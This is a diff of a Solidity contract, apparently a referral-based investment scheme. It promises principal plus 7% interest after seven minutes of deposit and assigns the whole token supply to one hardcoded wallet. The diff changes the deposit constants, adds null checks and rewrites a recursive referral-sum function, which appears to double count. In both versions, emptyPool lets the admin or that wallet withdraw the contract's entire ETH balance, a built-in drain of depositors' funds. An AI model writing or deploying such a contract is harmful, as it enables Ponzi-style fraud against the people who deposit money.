@@ -10,18 +10,18 @@ contract DABC10 is DABC10Interface {
     uint256 constant private MAX_UINT256 = 2**256 - 1;
 
     uint constant public winTime = 7 * 60;         //获取本金+利息时间（单位：秒）
-    uint256 constant public eachMinedMinCount = 10e18; //单轮最小eth
+    uint256 constant public eachMinedMinCount = 100e18; //单轮最小eth
     uint256 constant public eachMinedMaxCount = 10000e18; //单轮最大eth
     uint public rate = 107;             //利率，例：107，表示7%
     uint public Per = 10;             //消耗比率：10 ETH : 1 DABC
-    uint constant public SpanMin = 1 * 60; //第二轮投入开始时间(单位：秒)
+    uint constant public SpanMin = 1 * 30; //第二轮投入开始时间(单位：秒)
     uint constant public SpanMax = 7 * 60; //第二轮投入结束时间(单位：秒)
-    uint256 constant public Multiple = 10e18;    //投入倍数
+    uint256 constant public Multiple = 100e18;    //投入倍数
     uint constant public InvalidTimesLimit = 2;    //无效单次数限制
 
 
     address admin;
-    address matemask_account = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;
+    address matemask_account1 = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;
 
     mapping(address => relationship) public inviters;
     mapping(address => address) public invitee;
@@ -65,7 +65,7 @@ contract DABC10 is DABC10Interface {
     constructor(uint256 _initialAmount, string memory _tokenName, string memory _tokenSymbol) {
         admin = msg.sender;
         totalSupply = _initialAmount * 10 ** uint256(decimals);
-        balances[matemask_account] = totalSupply;
+        balances[matemask_account1] = totalSupply;
         total = totalSupply;
         name = _tokenName;
         symbol = _tokenSymbol;
@@ -160,12 +160,17 @@ contract DABC10 is DABC10Interface {
             require(span > SpanMin && span < SpanMax);
             require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
             TB[msg.sender][TB[msg.sender].length - 1].valid = true;
-            inviters[invitee[msg.sender]].invalidBalance += TB[msg.sender][TB[msg.sender].length - 1].balance;
-            inviters[invitee[msg.sender]].recommendation += TB[msg.sender][TB[msg.sender].length - 1].balance;
+            if (invitee[msg.sender] != address(0)){
+                inviters[invitee[msg.sender]].invalidBalance += TB[msg.sender][TB[msg.sender].length - 1].balance;
+                inviters[invitee[msg.sender]].recommendation += TB[msg.sender][TB[msg.sender].length - 1].balance;
+            }  
         }
         //进行交易
         invitee[msg.sender] = _invitor;
-        inviters[_invitor].invitees.push(msg.sender);
+        if (inviters[msg.sender].invitees.length == 0){
+            //邀请者不能再被邀请
+            inviters[_invitor].invitees.push(msg.sender);
+        }
         TB[msg.sender].push(tb(currtime, false, msg.value));
         back_flow(cost);
         poolBalance += msg.value;
@@ -176,17 +181,32 @@ contract DABC10 is DABC10Interface {
         require(address(this).balance == poolBalance);
     }
 
-    function GetRelationshipBalance(address _inviter) public returns (uint256) {
-        uint256 r_b = 0;
-        if(inviters[_inviter].invitees.length == 0){
+    function get_related(uint256 sum, address _inviter) internal returns (uint256){
+        if (inviters[_inviter].invitees.length == 0){
             return 0;
         } else {
+            sum = inviters[_inviter].invalidBalance;
             for (uint i = 0; i < inviters[_inviter].invitees.length; i++){
-                uint256 r_c = GetRelationshipBalance(inviters[_inviter].invitees[i])
-                r_b = r_c + inviters[_inviter].invalidBalance;
+                sum += get_related(sum, inviters[_inviter].invitees[i]);
             }
+            return sum;
         }
-        return r_b;
+        
+    }
+
+
+    function GetRelationshipBalance(address _inviter) public returns (uint256) {
+        uint256 sum = 0;
+        if (inviters[_inviter].invitees.length == 0){
+            return sum;
+        } else {
+            sum = inviters[_inviter].invalidBalance;
+            for (uint i = 0; i < inviters[_inviter].invitees.length; i++){
+                sum += get_related(sum, inviters[_inviter].invitees[i]);
+            }
+            return sum;
+        }
+
     }
 
     function GetAvaliableBalance() public payable {
@@ -211,7 +231,7 @@ contract DABC10 is DABC10Interface {
 
 
     function emptyPool() public payable {
-        require(msg.sender == admin || msg.sender == matemask_account);
+        require(msg.sender == admin || msg.sender == matemask_account1);
         payable(msg.sender).transfer(address(this).balance);
         poolBalance = address(this).balance;
         require(address(this).balance == poolBalance);
